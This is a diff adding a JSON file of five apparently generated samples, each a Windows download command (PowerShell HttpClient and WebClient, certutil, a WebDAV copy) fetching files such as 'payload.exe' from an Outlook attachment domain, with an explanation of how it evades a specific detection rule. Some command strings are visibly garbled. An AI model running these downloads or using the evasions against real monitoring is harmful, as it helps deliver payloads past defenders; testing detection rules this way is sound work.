@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -Command \"[System.Net.Http.HttpClient]::new().GetStringAsync('[https://attachment.outlook.live.net/owa/').Result]().Result)\"",
+    "explanation": "The rule uses an 'all of selection_*' condition. While 'selection_domains' is satisfied by the presence of the Outlook URL, the 'selection_download' filter specifically matches cmdlets, aliases, or classical .NET WebClient methods like '.DownloadString('. By using the newer '[System.Net.Http.HttpClient]' class and its methods like '.GetStringAsync(', the download pattern selection is entirely avoided."
+  },
+  {
+    "output": "powershell.exe -Command \"$url = 'https://' + 'attachment.outlook.live.net' + '/owa/'; Invoke-WebRequest -Uri $url\"",
+    "explanation": "The detection rule relies on the command line string containing the exact literal substring '[https://attachment.outlook.live.net/owa/]()'. Splitting or concatenating the URL string inside PowerShell prevents the complete static signature from appearing inside the monolithic process creation event command line, preventing 'selection_domains' from matching."
+  },
+  {
+    "output": "powershell -Command \"$u='https://attachment.outlook.live.net/owa/payload.exe'; $c=New-Object System.Net.WebClient; $c.DownloadFile($u.Replace('owa/','owa/'), 'C:\\\temp\\file.exe')\"",
+    "explanation": "The rule uses 'all of selection\\_*', meaning it requires both a specific download utility/string AND the target domain. By wrapping the URL in a variable and manipulating it (e.g., using .Replace() or concatenation) inside a PowerShell command that doesn't explicitly use the literal monitored strings in the CommandLine field, or by using a download method not listed (like System.Net.WebClient without calling the methods directly in a way the regex catches), the detection can be evaded."
+  },
+  {
+    "output": "certutil.exe -urlcache -split -f \"https://attachment.outlook.live.net/owa/malicious.exe\" C:\\windows\\\temp\\malicious.exe",
+    "explanation": "The 'selection\\_download' logic specifically looks for curl, wget, iwr, Start-BitsTransfer, and specific .NET methods. It fails to include 'certutil.exe', a common living-off-the-land binary (LOLBin) used for downloads. Since the condition is 'all of selection\\_*', using a tool not in the first list bypasses the rule even if the suspicious domain is present."
+  },
+  {
+    "output": "copy \"\\\\attachment.outlook.live.net@SSL\\owa\\file.txt\" C:\\\temp\\file.txt",
+    "explanation": "This bypass uses WebDAV to treat the remote Office domain as a network share. The 'selection\\_download' filter looks for web-based command-line utilities and PowerShell cmdlets, but does not account for standard file system commands like 'copy' or 'move' interacting with WebDAV paths."
+  }
+]
